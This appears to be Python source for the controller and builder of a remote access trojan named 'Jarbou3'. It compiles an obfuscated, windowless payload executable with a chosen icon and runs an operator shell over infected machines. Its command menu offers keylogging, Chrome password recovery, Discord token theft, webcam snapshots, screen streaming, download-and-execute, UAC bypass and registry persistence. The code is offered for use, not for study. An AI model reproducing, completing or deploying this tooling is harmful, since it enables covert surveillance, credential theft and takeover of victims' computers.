import random
import socket
import  requests
import json
import os
import threading
import platform
from os.path import *
import playsound
if platform.system() == "Windows":
    clear = "cls"
else:
    clear = "clear"

f = open('serverport.txt', 'r').read()
if f == "{}" or "":
    serverport = input('entre serverport:')
    with open('serverport.txt', 'w') as port:
        port.write(serverport)
keys = open('key.txt', 'r').read()
if keys == "{}" or "":
    key = input('entre serverkey:')
    with open('key.txt', 'w') as keyser:
        keyser.write(key)



def replace_string(filename, old_string, new_string):
    with open(filename) as f:
        s = f.read()
        if old_string not in s:
            return

    with open(filename, 'w') as f:
        s = s.replace(old_string, new_string)
        f.write(s)






def build():
    global key
    if platform.system() == "windows":
        try:
            import socket
            import json
            import subprocess
            import os
            import pyautogui
            import threading
            import shutil
            import sys
            from os.path import isfile
            import random
            import string
            from requests import get
            from webbrowser import open as op
            import getpass
            import ctypes
            from pynput.keyboard import Listener
            import time
            import win32crypt
            import sqlite3
            import base64
            from PIL import ImageGrab
            from urllib.request import Request, urlopen

            from cryptography.hazmat.backends import default_backend
            from cryptography.hazmat.primitives.ciphers import (
                Cipher, algorithms, modes)
        except Exception as moderror:
            print(moderror)
            print('run installed.bat and restart the tool')
            exit()


    else:
        import os
        from os.path import  isfile
        def genkey(length: int) -> bytes:
            return os.urandom(length)

        def xor_strings(s, t) -> bytes:
            if isinstance(s, str):
                # Text strings contain single characters
                return b"".join(chr(ord(a) ^ ord(b)) for a, b in zip(s, t))
            else:

                return bytes([a ^ b for a, b in zip(s, t)])

        print("""
1) lhost and lport
2) grab host and port from pastebin ex:127.0.0.1:4444
        """)
        c = int(input('choose:'))
        if c == 1:

            lhost = input('entre your host:')
            keyhost = genkey(len(lhost))
            cryptedhost = xor_strings(lhost.encode('utf8'), keyhost)

            lport = input('entre lport:')
            keyport = genkey(len(lport))
            cryptedport = xor_strings(lport.encode('utf8'), keyport)
            icon = ""
            while isfile(icon) == False:
                icon = input('entre your icon path:')
            if platform.system() == "windows":
                os.system('powershell -c cd stub; cp jarbou3.py ..')
            else:
                os.chdir("stub")
                os.system("cp  jarbou3.py ..")
            replace_string('jarbou3.py', '$lhost', str(cryptedhost))
            replace_string('jarbou3.py', '$lport', str(cryptedport))
            replace_string("jarbou3.py","$hostkey",str(keyhost))
            replace_string("jarbou3.py","$portkey",str(keyport))
            key = open('key.txt', 'r').read()
            replace_string('jarbou3.py', '$key', key)

            print('[+]Compiling')
            if platform.system() == "windows":
                os.system('pyinstaller --noconfirm --onefile --windowed --upx-dir upx --icon  "' + icon + '"  "jarbou3.py"')
            else:
                os.system('wine pyinstaller --noconfirm --onefile --windowed --upx-dir upx --icon  "' + icon + '"  "jarbou3.py"')

            if platform.system() == "windows":
                os.system('powershell -c cd dist; mv jarbou3.exe ..')
                os.remove('jarbou3.py')
            else:
                os.system("cd dist && mv jarbou3.exe ..")
                os.remove("jarbou3.py")
        elif c == 2:
            URL = input('entre you url:')
            u = requests.get(URL).text
            sp = u.split(':')
            print('host is:'+sp[0]+'\n port is:'+sp[1])
            if platform.system() == "windows":
                os.system('powershell -c cd stub; cp jarbou3-pastebin.py ..')
            else:
                os.chdir('stub')
                os.system("cp jarbou3-pastebin.py")
            ask = input('is  those your host and port(y/n):')
            if ask == 'y':
                replace_string('jarbou3-pastebin.py','$pastebin',URL)
                replace_string('jarbou3.py', '$key', key)
                icon = ''
                while isfile(icon) == False:
                    icon = input('entre your icon path:')
                print('[+]Compiling')
                if platform.system() == "windows":
                    os.system('pyinstaller --noconfirm --onefile --windowed --icon "' + icon + '"  "jarbou3-pastebin.py"')
                    os.system('powershell -c cd dist; mv jarbou3-pastebin.exe ..')
                else:
                    os.system('wine pyinstaller --noconfirm --onefile --windowed --upx-dir upx --icon  "' + icon + '"  "jarbou3-pastebin.py"')
                    os.system("cd dist && mv jarbou3-pastebin.exe ..")
                os.remove("jarbou3-pastebin.py")
            else:
                os.remove('jarbou3-pastebin.py')
                build()
        else:
            build()




def banner():
    banner1 = """
     ___  _______  ______    _______  _______  __   __  _______ 
    |   ||   _   ||    _ |  |  _    ||       ||  | |  ||       |
    |   ||  |_|  ||   | ||  | |_|   ||   _   ||  | |  ||___    |
    |   ||       ||   |_||_ |       ||  | |  ||  |_|  | ___|   |
 ___|   ||       ||    __  ||  _   | |  |_|  ||       ||___    |
|       ||   _   ||   |  | || |_|   ||       ||       | ___|   |
|_______||__| |__||___|  |_||_______||_______||_______||_______|   
    By youhacker55"""
    banner2 = """
         ) _     _
    ( (^)-~-(^)
__,-.\_( 6 6 )__,-.___
  'M'   \   /   'M'
         >o<
       Jarbou3
 
 By youhacker55
   
   """
    banner3 = """                                   
                                       %%%%%%%%%                                                                                                                                                        
                              %%%%%%%%%%%%%%%%%%%%%%%%%%                                                                                                                                                
                          %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@&%%%                                                                                                                                           
                      %%%%%%%%%%%%%%%%%%%%%%%%(((%(@%%%%%%%@%%%%                                                                                                                                        
                    %%%%%%%%%%%%%%%%%%%%%%%%%@(%%%%%&(@(((((((*//(@&%,                                                                                                                                  
                 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%(&%%%((((((%%&%%%/.#%%%%&                                                                                                                               
               %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%(%%,&#@#(/((#&%%(* ,/&%((/(((((**                                                                                                                         
             ,%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@%###((((((#(#&&@%@#((((#/((((((&@/                                                                                                                       
            %%%%%%%%%%%%%%%%%%%%%%%%%%%%@&%%%%,####@@%%@@%%(#((((((((%/(((((((#%                                                                                                                        
           %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#####(((#/@@(((((((&@#########%%#                                                                                                                            
         (%%%%%%%%%%%%%%%%%%%%%%%%%%%%&%%&#%%&*%#(/(((((((####%###@%%%%&%%%%%.                                                                                                                          
        (%%@%%%%%%%%%%%%%%%@%%%%%%@%%%%%(((&(((/#((#((((((((##%####%%%%%%%%%%%                                                                                                         .                
       .%%%%%&@@%%%%@%%%%%%%%%@&%%%@%@@(@((((*(#(((/(@(((((((###&#(/%%%%%%%%%%%                                                                                                          @              
       %%%%%%%%&@@%%@@%%%%%%%%%%@@&%@@(#((((/@&(%&(((((%@@(((@((#(((%%%%%%%%%%%%                                                                                                       @  @@            
      %%%%%%%%%%%@@@&@@&%%%%%%%%%&@@@@@&###%((&#(%&(((@#(&@@#(@##((((*%%%@((&@%%.       .                                                                                               @@%@@/          
      %%%%%%%%%%%%%@@@@@&%%%%%%%%%%@@@@@@&%%(&&@%#(((#(((((@@@#@@(((((((((%%&%@%%        @                                                @             @#                               @@@@*%         
     %%%%%%%%%%%%%%%@@@@@%%%%%%%%%@ %@@@@%#&((@#(/((#((((((**@@@@@#####%%%%%%%%%%         @%                                                @&            @@                              @@@@@         
     %%%%%%%%%%%%%%%%@@@@@@@@@@@@@@###@@@@@@@@@@@@@@@@@@@@@@*/@@@@@@@@@@@@@@@@@@@@@@@@    ,@@@@@@@@@@@@@@@@@@@@@@       @@@@@@@@@@@@@@@@@@   %@@@@@@@@@@   @@@@@@@@@@@@   @@@@@@@@@@@@@@@@@@@@@         
    *%%%%%%%%%%%%%%%%%@@@@@@@@@@@@@###@@@@@@@@@@@@@@@@@@@@@*((&@@@@@@@@@@@@@@@@@@@@@@@@(   @@@@@@@@@@@@@@@@@@@@@@@@   &@@@@@@@@@@@@@@@@@@@@@   @@@@@@@@     @@@@@@@@@@   @@@@@@@@@@@@@@@@@@@@@@         
    %%%%%%%%%%%%%%%%%%%@@@@@@@@@,%&%##@@@@@@@@@%@@@@@@@@((*((,,%@@@@@@@@@@%%%%@@@@@@@@@    ,@@@@@@@@@     @@@@@@@@   *@@@@@@@@    %@@@@@@@@   @@@@@@@@     @@@@@@@@     @@@@@@@@     @@@@@@@@@          
    %%%%%%%%%%%%%%%%%%%@@@@@@@@%######@@@@@@@@##@@@@@@@@((((((&%@@@@@@@@@%%%%@@@@@@@@@     (@@@@@@@@     @@@@@@@@    @@@@@@@@    .@@@@@@@@   @@@@@@@@,    @@@@@@@@                  @@@@@@@@@           
    %%%%%%%%%%%%%%%%%%@@@@@@@@%% ###%@@@@@@@@##@@@@@@@@(((((/(,@@@@@@@@@@@@@@@@@@@@@@      @@@@@@@@@@@@@@@@@@@@     @@@@@@@@     @@@@@@@@   @@@@@@@@%    @@@@@@@@          @@@@@@@@@@@@@@@@             
    *%%%%%%%%%%%%%%%%@@@@@@@@%% ###@@@@@@@@&##%@@@@@@@@((((((*%@@@@@@@@@@@@@@@@@@&        @@@@@@@@@@@@@@@@@@@@     @@@@@@@@     @@@@@@@@   @@@@@@@@@    @@@@@@@@,         #@@@@@@@@@@@@@@.              
     %%%@@@@@@@&%%%%@@@@@@@@%%% #%@@@@@@@@@@@@@@@@@@@@@((((#((@@@@@@@@%%&@@@@@@@@&       @@@@@@@@     @@@@@@@@    @@@@@@@@     @@@@@@@@   #@@@@@@@@    @@@@@@@@@                 .@@@@@@@@              
   ((((@@@@@@@@%%%%@@@@@@@@%%%%#@@@@@@@@@@@@@@@@@@@@@@(((##(#@@@@@@@@%%%%%@@@@@@@@      @@@@@@@@     @@@@@@@@    @@@@@@@@     @@@@@@@@   .@@@@@@@@    @@@@@@@@@     @@@@@@@@     @@@@@@@@               
  ((% @@@@@@@@@@@@@@@@@@@@@&&&&@@@@@@@@@(((##@@@@@@@@@@@%##@@@@@@@@@@@@%%@@@@@@@@@@@   @@@@@@@@@@@@@@@@@@@@@(   @@@@@@@@@@@@@@@@@@@@@    @@@@@@@@@@@@@@@@@@@@@     @@@@@@@@@@@@@@@@@@@@@                
   .%((@@@@@@@@@@@@@@@@@@&&&@@@@@@@@@@#((###%@@@@@@@@@@##@@@@@@@@@@@@%%%@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@      @@@@@@@@@@@@@@@@@@@     @@@@@@@@@@@@@@@@@@@      @@@@@@@@@@@@@@@@@@@@@                 
      /@%@@@@@@@@@@@@&&&&@@@@@@@@@@@@#######@@@@@@@@#@%@@@@@@@@@@@%%%%%@@@@@@@@&  @@@@@@@@@@@@@@@@@@@@@@           @@@@@@@@@@@@@           @@@@@@@@@@@@@%        @@@@@@@@@@@@@@@@@@(                    
       .%%%&@%%%%%%%%%%%%%%%###&########%###(&&&&&%%&@#&%*#%%%%%%%%%%%%%%%%%%%%                                                                                                                         
        #%%%%%%%&&&@#%%%%%%%%%###%##%#%&&&&&&&&&&&%%%%%@%@##(((%%%%%%%%%%%%%%%                                                                                                                          
         (%%%%%%%%%%%&&&&&&&&&&&%%%&&&&&&&&&&&&%&&&&&&&&&&&&&&&%#@%%%%%%%%%%%                                                                                                                           
           %%%%%%%%%%%%%%%%%&&&#((&&&&&%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                                                                                            
            %%%%%%%%%%%%%%%%&#(((%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%(                                                                                                                             
             *%%%%%%%%%%&%@((((//%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                                                                                               
               %%%%%%%%%&(%&(&(%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                                                                                                 
                 %%%%%%%%%%@%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                                                                                                   
                    %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                                                                                                     
                      %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                                                                                                        
                          %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                                                                                                           
                              %%%%%%%%%%%%%%%%%%%%%%%%%%                                                                                                                                                
                                       %%%%%%%%%
                                       By youhacker55                                                                                                                                                                                                                                                                                                              
    """
    banner4 = """
                           ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,/////,,,,,,,,,,,,,,,,,,,,,,,,                                                   
                        ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,./*//////.///,,,,,,,,,,,,,,,,,,,,,,                                                 
                     /,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,//////,,,*,,,./(,,,,,,,,,,(,,,,/.,,,,,                                               
                   ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,, ////,,,,,,,,,,///(,,,,,.,,,,,,,,/(,,,,,,                                             
                .,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,&///,,,,,,,,,,,,///(*,, ,,,,,,,,,,/,,,,,,,*                                           
              ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,%,#,/ . ,,.* ***( ///( @,  ,. *, ,/,,,,,,,,,                                          
            ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,#.,**,,..  . . ..((/(%(////////(/##(///#.,,,,,,,                                        
          ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,/.,,@/,,,,,*/ /**///////////(#///////////(,,,,,,                                       
        ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,.,/.,,,,,. *,,,,,,.,(///////////(////#(#///#///## ,,                                      
      ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,.,* ,,,(*****,*/////////////////////,//. / /(/##///# ..                                   
    ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,.. **///, ,,,,,,,,,,,,, .,,*** .*********//////////////(  ...,.. .....,*//(/# ., */&@@@@/                        
  ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,..,.,,,,,,,,, ,,,,,,,,, (*,,, *.***(///////#((/(///////......**..,..,,,,,*,,,,,..*/(@@@@@@@@                      
,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,..,,,,,,,,,,,,.. ,,. @,******* ,,/////////((///////////*..,.....,,,,*//(##%%#(*,...,,*(#&%(@@@                     
,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,..,,,,,,,,,,,,,.@%****** ******/(*., . ////////////// ( ....,,,,*//(##&&@@@@&#/*,......,,/***                       
,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,.,/**//,..,,,,,,,,,,*** *,.** *****/**/// .(/.., /(/////// * ///*,.. ,,*//((###%%#%#(/,*%*.......,,,./                      
,,,,,,,,,,,@,,,,,,,%,,,,,,,@,,,,,,@,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,*,,,,,,,,,,.., ,, #/****.*,** ,*,/***///*///,*(////.,,,##( . (/(/,#  .....,,,,,,,,,,,,,,.,,. (///////(#.     @                
,,,,,,,,,,,,,@@@,,,@@,,,,,,,,@@@,,,@#,,,,,,,,,,,,,,,,@@,,,,,,,,,,,,,,,,*,,,,,,,,,,,,,, . //*////////  ,*.*******/////*//  ///////..,,,*,,,,. *********.    .       .(//////////////.     @              
,,,,,,,,,,,,,,,@@@@,@@,,,,,,,,,#@@@@@@,,,,,,,,,,,,,,,,,@@@,,,@,,,,,,,,*,,,,,,,, /*//////,*/,#,//,/////*////***(//////////***  .*  (////******/(//////////////////*/(#(##(#(//(///////# @ (@@            
,,,,,,,,,,,,,,,,,@@@@@@@,,,,,,,,,@@@@@@,,,,,,,,,,,,,,,,,,@@@@,@@,,,,,,*,,,,,,,. .,... //@# //////////////###*////(///////////////////////////////////@#//////////////////////(####*/////@@@@@@&         
,,,,,,,,,,,,,,,,,,,@@@@@@,,,,,,,,,,@@@@@,,,,,,,,,,,,,,,,,,,@@@@@@,,,,. ,,,,,,,.,////,.,%/@(,//////////#/(///(///////##////////////(//****@@///     ..(//@@*/**////(///////////(///(##///(@@@@@@         
,,,,,,,,,,,,,,,,,,,,@@@@@@,,,,,,,,,,@@@@@,,,,,,,,,,,,@,,,,,,,@@@@@,,,,,,,,,,,,////*///////@@/*.////#(///*,,//#(///,////////////////*********@@ ... ,//***#@@**((//,,*,,****///(//////////*@@@@@         
,,,,,,,,,,,,,,,,,,,,,@@@@@@@@@@@@@@*,@@@@@@@@@@@@@@@@@@@@@@@,,@@@@@@@@@@@@@@@@@@@@@@@@////@@@@@@@@@@@@@@@@@@@@@@@(*,////@@@@@@@@@@@@@@@@@@***@@@@@@@@@@@***@@@@@@@@@@@@(/(@@@@@@@@@@@@@@@@@@@@@         
,,,,,,,,,,,,,,,,,,,,,,@@@@@@@@@@@@@,,,@@@@@@@@@@@@@@@@@@@@@,,,,@@@@@@@@@@@@@@@@@@@@@@@@@/*/@@@@@@@@@@@@@@@@@@@@@@@@///@@@@@@@@@@@@@@@@@@@@@@***@@@@@@@@*****@@@@@@@@@@///@@@@@@@@@@@@@@@@@@@@@@         
,,,,,,,,,,,,,,,,,,,,,,@@@@@@@@@@,,,,,,@@@@@@@@@@@@@@@@@@,,,,,,,,@@@@@@@@@@***,@@@@@@@@@////@@@@@@@@@@//*#.@@@@@@@@///@@@@@@@@@////@@@@@@@@@***@@@@@@@@(** *@@@@@@@@****,@@@@@@@@***//@@@@@@@@@          
,,,,,,,,,,,,,,,,,,,,,,@@@@@@@@@,,,,,,,@@@@@@@@,@@@@@@@@@,,,,,,,,@@@@@@@@@**  @@@@@@@@@***  @@@@@@@@@//,..@@@@@@@@///#@@@@@@@@////@@@@@@@@@***@@@@@@@@@,,,,@@@@@@@@,. ***,**.********@@@@@@@@@           
,,,,,,,,,,,,,,,,,,,,,,@@@@@@@@,,,,,,@@@@@@@@@,,@@@@@@@@*,,,,,,,@@@@@@@@@@@@@@@@@@@@@@,.../&@@@@@@@@@@@@@@@@@@@@/////@@@@@@@@////%@@@@@@@@***@@@@@@@@@,,,,@@@@@@@@,,.,,,,,,,@@@@@@@@@@@@@@@@             
,,,,,,,,,,,,,,,,,,,,,@@@@@@@@,,,,,,@@@@@@@@@,,#@@@@@@@@,,,,,,,@@@@@@@@@@@@@@@@@@@@ ,... /(@@@@@@@@@@@@@@@@@@@@/////@@@@@@@@/////@@@@@@@@***@@@@@@@@@*,,,@@@@@@@@(,,,,,,,,,@@@@@@@@@@@@@@@/              
,,,,,,,*@@@@@@@@,,,,@@@@@@@@,,,,,%@@@@@@@@@@@@@@@@@@@@@,,,,,,(@@@@@@@@**@@@@@@@@@% ....*/@@@@@@@@/ ,,.@@@@@@@@////@@@@@@@@/////@@@@@@@@***@@@@@@@@@* .,@@@@@@@@@,,.,,,,,,,,.,,,  %@@@@@@@@   #          
,,,,,,,@@@@@@@@,,,,@@@@@@@@,,,,,@@@@@@@@@@@@@@@@@@@@@@,,, /.&@@@@@@@@**,**@@@@@@@@//...,@@@@@@@@////.@@@@@@@@@///@@@@@@@@/////@@@@@@@@***@@@@@@@@@/, ,@@@@@@@@@,,,,,@@@@@@@@,,,  @@@@@@@@               
,,,,,,@@@@@@@@@@@@@@@@@@@@@,,,,@@@@@@@@@,,,,,@@@@@@@@@@@#. @@@@@@@@@@@@**@@@@@@@@@@@/#&@@@@@@@@@@@@@@@@@@@@@@//*@@@@@@@@@@@@@@@@@@@@@///(@@@@@@@@@@@@@@@@@@@@@,,,,,@@@@@@@@@@@@@@@@@@@@@ %%             
,,,,,,,@@@@@@@@@@@@@@@@@@,,,@@@@@@@@@@,,,,,,@@@@@@@@@@@**@@@@@@@@@@@@***@@@@@@@@@@@.@@@@@@@@@@@@@@@@@@@@@@@/,*. .@@@@@@@@@@@@@@@@@@@/////@@@@@@@@@@@@@@@@@@@,,,,,,@@@@@@@@@@@@@@@@@@@@@                 
,,,,,,,,,@@@@@@@@@@@@,,,,@@@@@@@@@@@@,,,,,,,@@@@@@@@. .@@@@@@@@@@@*****@@@@@@@@@,*@@@@@@@@@@@@@@@@@@@@@@* * ///////@@@@@@@@@@@@@%//////////@@@@@@@@@@@@@@.,,,,,,,@@@@@@@@@@@@@@@@@@@                    
,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,.**,,..* **.***************,,***.///#*//*//,*//#**///////*//////////////////////////////////////(,,,,,,,,,,,,,,,,,,,,,,,,,,,,          *              
,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,, @*.,,*.*.********************,***.*/#*//(//*,/( ///**/*///////////////////(#(///////(////////////(,.,,,,,,,,,,,,,,,,,,,,,,,,,                         
,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,@ @******,********************** . *, ***///..*//#/////////////////////////####//////////////////////# ,,,,,,,,,,,,,,,,,,,,,,,,,                         
,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,@*******************************.** ,*****  .**/#.///////////////////#(/#######//////////(.////////(//# ,,,,,,,,,, (,,,,,,,,,,,%                         
/ ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,.@%,*******************************.*** *****, ,/// (//////////////////###########/////////(**(/////(//(//////..////,,/(////.,,,,,                          
. ,,*// ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,@@@********************************,**., .....,..,/..////////,(///////#########(//////#,/***********..*////////,,,*,,,,*,,,/.%&&&%% .                      
,,,,,,,...,*// ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,.@*************************************.  ***   *//.,//////(///(//////#########//////%,*************** ,,,,,,,,,,,,,,,,,,*,*(*.,,,                          
.,,,,,,,,,,,,,,.. */// ,,,,,,,,,,,,,,,,,, @@(*******************///*/(***************........//.*.///////////////(#####///////%&,**%&%%***********/& ,,,,,,,,   .,.,,, /* ,,,(                          
......,,,,,,,,,,,,,,,,,,,,...,,,,,,,,,,,, @*************,****(/////////(*************///%// .. ..,//////////////(###///////%%.,,,,,,,%..,%&%,.,,,,,,,,,,,,,,,,,,,, ,*,, ,,,,,                           
..,,.......,,...,,,,,,,,,,,,,,,,,,,,,,, @#********** **,  ***//////////************* /#%#/./ #.%# (/////////////#(///////%#%,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,                            
.....................,,,,,,,,,,,,,,,,,.@***********,*,,,,/,,#/////////(**************,%%./#/.// ##/////////////#(//////%%#%,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,                            
..........................,,,,,,,,, %@*,***********,,, ,.//// ////////*************////./ .(#,#/%///////////////////////#,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,                             
.....   .......................,,,  ,************ ,..,.//// //* ///#////**********////// #//(#(  ///////////////////(//%.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,                              
By youhacker55
    """
    banners = [banner1,banner2,banner3,banner4]
    print(random.choice(banners))

def reliable_recv(target):
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def reliable_send(target, data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())


def upload_file(target, file_name):
        f = open(file_name, 'rb')
        target.send(f.read())






def download_file(target,file_name):
    f = open(file_name, 'wb')
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()






def target_communication(target, ip):
    try:
        count = 0
        while True:
            command = input('youhacker-Shell~%s: ' % str(ip))
            reliable_send(target, command)
            if command == 'quit':
                targets.remove(target)
                ips.remove(ip)
                users.remove(users[num])
                break

            elif command == 'back':
                break
            elif command == 'clear':
                os.system(clear)
            elif command[:6] == 'upload':

                    print('[*] uploading file')
                    try:
                        upload_file(target, command[7:])
                    except:
                        print('[-] Error in Uploading')
                    else:
                        print('[+] file uploaded')


            elif command == 'ngroksetup':
                if isfile('scripts\\ngrok.exe') == True:
                    print("[*] Uploading Ngrok.exe")
                    try:
                        upload_file(target, 'scripts\\ngrok.exe')
                    except:
                        print("[-] Error Uploading Ngrok")
                    else:
                        token = input("entre your ngrok token:")
                        target.send(token.encode('utf-8'))
                        print(target.recv(1024).decode())
                        continue



                else:
                    pass
            elif command[:8] == 'download':

                    print('[*]Downloading ' + command[9:])

                    try:
                        download_file(target, command[9:])
                    except:
                        print('[-] Can t download the file')
                    else:
                        print('[+] File Downloaded')
            elif command[:10] == 'screenshot':
                print("[*] Taking Screenshot")
                try:
                    f = open('screenshot%d' % (count) + '.png', 'wb')
                    target.settimeout(3)
                    chunk = target.recv(1024)
                    while chunk:
                        f.write(chunk)
                        try:
                            chunk = target.recv(1024)
                        except socket.timeout as e:
                            break
                    target.settimeout(None)
                    f.close()

                except:
                    print("[-] Can t take screenshot")
                else:
                    print("[+] Done Screenshot Saved As screenshot%d" % (count) + ".png")
                    count += 1

            elif command == 'help':
                print(('''\n
                    quit                                --> Quit Session With The Target
                    isopen                              --> Scan a Client port Syntax=isopen ip:port
                    clear                               --> Clear The Screen
                    cd path                             --> Changes Directory On Target System
                    upload filename                    --> Upload File To The target Machine
                    download filename                   --> Download File From Target Machine
                    keylog_start                        --> Start The Keylogger
                    keylog_dump                         --> Read keylogged logs
                    keylog_stop                         -->  Stop keylogger
                    open_link                            --> Open a URL
                    screenshot                          -->  make a screenshot
                    dexec                               --> download and execute file from the internet
                    start                               --> execute a programme
                    run-pwr                            --> execute powershell command
                    msgbox                             --> show msgbox ex:msgbox|yourtitle|yourtext
                    chrome_recon                       --> recover Chrome Passwords
                    disteal                            --> Get Discord tokens
                    priv                               --> Check User Priv
                    sysinfo                            --> get system information
                    say                                --> make Target Computer talk ex: say something
                    clip                               --> change data in clipoard
                    pslist                             --> print the running process on the client
                    kill                               --> kill running process with pid example:kill 1009
                    screenshare                        --> stream client screen
                    ssharescreen                       --> stopstreaming
                    ngroksetup                         --> download ngrok on the client
                    webcam_snap                        --> open target webcam and get Pic ex:webcam_snap 0
                    webcam_list                        --> get Available Webcam Sources
                    changepolicy                       --> execute powershell scripts
                    cwallpaper                         --> change wallpaper
                    bypass-uac                         --> try to bypass uac
                    findfiles                          --> example findfiles|txt|C:\\
                    playsound                          --> play wav file in the background (just .wav)
                    av_recon                           --> Get Infos about Av
                    persistence *RegName* *fileName*    --> Create Persistence In Registry'''))
            elif command[:11] == 'screenshare':
                upload_file(target, 'scripts\\screenshare.ps1')
            elif command[:11] == "webcam_snap":
                print('[*] Openning Webcam')
                try:
                    download_file(target,'webcam.jpg')
                except:
                    print("[-] Error Getting image")
                else:
                    print("[+] Image Captured")
                    os.system('start webcam.jpg')
            elif command[:10] == "bypass-uac":
                print("[*] you will lose session after trying exploit")
                targets.remove(target)
                ips.remove(ip)
                users.remove(users[num])
            elif command[:5] == 'dexec':
                print(target.recv(1024).decode('utf-8'))


            elif command[:10] == 'cwallpaper':
                if isfile(command[11:]) == True:
                    print("[*] Uploading Picture")
                    try:

                        upload_file(target, command[11:])
                        reliable_send(target, 'somedata')
                    except:
                        print("[-] Something Wrong")
                    else:
                        print("[+] Wallpaper changed")
                else:
                    print("[-] File Not Found")
            elif command[:5] == 'start':
                print(target.recv(1024).decode())
            elif command[:9] == 'playsound':
                if command[10:][-4:] != '.wav':
                    target.send('nsupport'.encode())
                    print(target.recv(1024).decode())


                else:
                    target.send('supported'.encode())
                    print("[*] Uploading Wav File to the Target")
                    try:
                        upload_file(target,command[10:])
                    except:
                        print("[-] Failed Uploading The File")
                    else:
                        print("[+] Wav File Started")

            else:
                result = reliable_recv(target)
                print(result)

    except:
        targets.remove(target)
        ips.remove(ip)
        users.remove(users[num])
        print("[-] session lost")


def accept_connections():
    global clients
    global  user
    while True:
        if stop_flag:
            break
        sock.settimeout(1)
        try:
            target, ip = sock.accept()
            key = open('key.txt', 'r').read()
            cred = target.recv(1024).decode().split(':')
            user = cred[1]

            if  cred[0]== key and user not in users:
                users.append(user)
                targets.append(target)
                ips.append(ip)

                print((str(ip) + ' has connected!'))
                cur = os.getcwd()

                path = 'sounds'
                os.chdir(path)
                playsound.playsound("jarbou3.wav", True)
                clients += 1
                os.chdir(cur)
